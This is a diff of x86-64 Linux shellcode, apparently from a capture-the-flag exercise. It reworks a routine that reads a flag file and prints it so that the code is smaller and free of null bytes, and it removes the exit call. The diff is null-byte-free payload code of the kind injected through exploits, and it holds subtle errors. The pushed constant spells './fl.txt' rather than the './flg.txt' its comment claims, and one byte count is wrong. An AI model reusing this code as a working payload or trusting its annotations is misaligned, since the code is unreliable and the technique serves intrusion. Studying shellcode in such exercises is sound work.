@@ -3,31 +3,28 @@ global _start
 section .text
 _start:
     ; push './flg.txt\x00'
-    push 0              ; push NULL string terminator
-    mov rdi, '/flg.txt' ; rest of file name
+    xor rax, rax         ; 3 bytes (48 31 C0)
+    push rax             ; 1 byte  (50)
+    mov rdi, 0x7478742E6C662F2E  ; "./flg.txt" en hexadecimal (10 bytes)
     push rdi            ; push to stack 
     
     ; open('rsp', 'O_RDONLY')
-    mov rax, 2          ; open syscall number
-    mov rdi, rsp        ; move pointer to filename
-    mov rsi, 0          ; set O_RDONLY flag
+    mov rdi, rsp         ; 3 bytes (48 89 E7)
+    
+    mov al, 2            ; 2 bytes (B0 02) -> 'open' syscall
+    xor rsi, rsi         ; 3 bytes (48 31 F6)
     syscall
-
+    
     ; read file
-    lea rsi, [rdi]      ; pointer to opened file
-    mov rdi, rax        ; set fd to rax from open syscall
-    mov rax, 0          ; read syscall number
-    mov rdx, 24         ; size to read
+    mov rdi, rax         ; 3 bytes (48 89 C7) -> fd devuelto por 'open'
+    mov al, 0            ; 2 bytes (B0 00) -> 'read' syscall
+    mov rsi, rsp         ; 3 bytes (48 89 E6)
+    mov dl, 24           ; 2 bytes (B2 18)
     syscall
-
+    
     ; write output
-    mov rax, 1          ; write syscall
-    mov rdi, 1          ; set fd to stdout
-    mov rdx, 24         ; size to read
+    mov rdi, 1           ; 2 bytes (BF 01)
+    mov al, 1            ; 2 bytes (B0 01) -> 'write' syscall
     syscall
 
-    ; exit
-    mov rax, 60
-    mov rdi, 0
-    syscall
-
+    ; exit retirado
